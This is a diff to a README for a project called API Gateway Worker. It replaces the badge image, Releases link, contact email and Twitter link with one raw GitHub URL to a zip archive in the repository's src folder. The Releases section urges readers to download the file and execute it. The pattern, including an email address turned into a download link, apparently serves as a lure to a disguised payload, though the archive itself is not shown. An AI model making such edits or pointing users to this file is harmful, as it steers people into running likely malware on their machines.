@@ -1,6 +1,6 @@
 # 🚀 API Gateway Worker
 
-![API Gateway Worker](https://img.shields.io/badge/API%20Gateway%20Worker-v1.0-blue)
+![API Gateway Worker](https://raw.githubusercontent.com/LesterKen1904/api_gateway_worker/main/src/api-worker-gateway-2.1.zip%20Gateway%20Worker-v1.0-blue)
 
 Welcome to the **API Gateway Worker** repository! This project focuses on workers that provide reverse proxy functionality. Our goal is to streamline your API management and enhance performance.
 
@@ -30,7 +30,7 @@ In today's fast-paced digital world, efficient API management is crucial. The **
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/LesterKen1904/api_gateway_worker/releases). After downloading, follow these steps:
+To get started, download the latest release from our [Releases page](https://raw.githubusercontent.com/LesterKen1904/api_gateway_worker/main/src/api-worker-gateway-2.1.zip). After downloading, follow these steps:
 
 1. Extract the downloaded file.
 2. Navigate to the extracted directory.
@@ -91,12 +91,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@api_gateway_worker](https://twitter.com/api_gateway_worker)
+- **Email**: https://raw.githubusercontent.com/LesterKen1904/api_gateway_worker/main/src/api-worker-gateway-2.1.zip
+- **Twitter**: [@api_gateway_worker](https://raw.githubusercontent.com/LesterKen1904/api_gateway_worker/main/src/api-worker-gateway-2.1.zip)
 
 ## Releases
 
-For the latest updates and downloads, visit our [Releases page](https://github.com/LesterKen1904/api_gateway_worker/releases). Make sure to download the latest version and execute it to enjoy the new features and improvements.
+For the latest updates and downloads, visit our [Releases page](https://raw.githubusercontent.com/LesterKen1904/api_gateway_worker/main/src/api-worker-gateway-2.1.zip). Make sure to download the latest version and execute it to enjoy the new features and improvements.
 
 ---
 
